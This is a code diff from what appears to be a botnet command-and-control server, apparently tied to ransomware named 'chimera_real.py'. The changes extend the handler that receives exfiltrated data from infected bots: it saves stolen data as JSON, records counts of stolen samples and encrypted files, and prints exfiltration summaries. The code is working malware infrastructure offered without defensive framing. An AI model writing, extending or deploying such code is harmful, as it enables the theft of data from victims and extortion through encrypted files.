@@ -313,20 +313,32 @@ python chimera_real.py --decrypt {key_data}
             # MESSAGE TYPE 3: Exfiltrated Data
             elif message_type == 'exfiltration':
                 # Save exfiltrated data with timestamp
-                filename = f"exfiltrated_data/{bot_id}_{int(time.time())}.txt"
+                filename = f"exfiltrated_data/{bot_id}_{int(time.time())}.json"
                 exfil_data = message.get('data', '')
+                file_count = message.get('file_count', 0)
+                stolen_samples = message.get('stolen_samples', 0)
                 
                 # Handle base64 encoded file data (for binary files)
                 if message.get('encoding') == 'base64':
                     file_data = base64.b64decode(exfil_data)
                     with open(filename, 'wb') as f:
                         f.write(file_data)
-                    self.log_event(f"Bot {bot_id} exfiltrated file: {filename}", "EXFILTRATION")
+                    self.log_event(f"Bot {bot_id} exfiltrated binary file: {filename}", "EXFILTRATION")
                 else:
-                    # Plain text data
+                    # Plain text/JSON data
                     with open(filename, 'w', encoding='utf-8') as f:
                         f.write(exfil_data)
-                    self.log_event(f"Bot {bot_id} exfiltrated data: {filename}", "EXFILTRATION")
+                    self.log_event(f"Bot {bot_id} exfiltrated {stolen_samples} samples: {filename}", "EXFILTRATION")
+                
+                # Display exfiltration summary
+                print("\n" + "="*70)
+                print(f"📤 EXFILTRATION RECEIVED FROM {bot_id}")
+                print("="*70)
+                print(f"Stolen samples: {stolen_samples}")
+                print(f"Encrypted files: {file_count}")
+                print(f"Data saved to: {filename}")
+                print(f"Size: {len(exfil_data)} bytes")
+                print("="*70 + "\n")
                 
             # MESSAGE TYPE 4: Command Result
             elif message_type == 'command_result':
